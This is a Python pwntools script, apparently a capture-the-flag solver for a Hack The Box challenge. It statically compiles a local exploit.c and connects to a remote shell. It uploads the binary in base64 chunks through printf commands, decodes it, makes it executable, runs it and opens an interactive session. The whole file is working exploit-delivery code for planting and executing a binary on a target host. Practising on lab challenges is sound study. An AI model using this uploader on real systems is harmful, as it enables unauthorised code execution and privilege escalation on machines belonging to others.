#!/usr/bin/python3
from pwn import *
import warnings
import base64
import gzip
import os
import subprocess
import sys
warnings.filterwarnings('ignore')

context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

os.system('clear')

IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
r    = remote(IP, PORT)
print(f'Running solver remotely at {IP} {PORT}\n')

sla = lambda x,y : r.sendlineafter(x,y)

# Compile the exploit.c statically
# Prefer musl-gcc for smaller binaries, fall back to gcc -static
exp_path = './exp'
src_path = './exp.c'

if not os.path.exists(src_path):
    print(f'[-] Cannot find {src_path} -- make sure you run this from the htb/ directory')
    sys.exit(1)

if subprocess.run(['which', 'musl-gcc'], capture_output=True).returncode == 0:
    print('[*] Compiling with musl-gcc...')
    ret = os.system(f'musl-gcc {src_path} -static -o {exp_path}')
else:
    print('[*] musl-gcc not found, falling back to gcc -static -no-pie...')
    ret = os.system(f'gcc {src_path} -static -no-pie -O2 -o {exp_path}')

if ret != 0 or not os.path.exists(exp_path):
    print('[-] Compilation failed!')
    sys.exit(1)

# base64 the exploit and send it in chunks
with open(exp_path, 'rb') as inf:
  exploit = inf.read()
print(f'[+] Exploit binary size: {len(exploit)} bytes')

data = base64.b64encode(gzip.compress(exploit))

# Split it to chunks
chunk_size = 256
n_chunks  = len(data) // chunk_size
n_chunks += 1 if len(data) % chunk_size else 0

for i in range(n_chunks):
  print(f'\r[*] Uploading the exploit: {i}/{n_chunks}', end='')
  chunk = data[chunk_size*i: (i+1)*chunk_size].decode()
  sla(b'$ ', f"printf '%s' '{chunk}' >> /home/exp.base64".encode())

print(f'\n[+] Done: {n_chunks}/{n_chunks}')

print(f'[*] Base64 decode the exploit..')
sla(b'$ ', b'base64 -d /home/exp.base64 > /home/exp.gz')

print(f'[*] gzip decompress the exploit..')
sla(b'$ ', b'gunzip -c /home/exp.gz > /home/exp')

print(f'[*] Granting +x permission..')
sla(b'$ ', b'chmod +x /home/exp')

# Verify the file exists and has content
print(f'[*] Verifying exploit..')
sla(b'$ ', b'ls -la /home/exp')

print(f'[*] Checking file type..')
sla(b'$ ', b'file /home/exp')

print(f'[*] Running the exploit..\n')
r.sendlineafter(b'$ ', b'/home/exp')

# Read exploit output until next shell prompt or timeout
output = b''
try:
    output = r.recvuntil(b'$ ', timeout=8)
except:
    pass

try:
    print(output.decode('utf-8', errors='replace'))
except:
    pass

os.system(f'rm -f {exp_path}')

r.interactive()
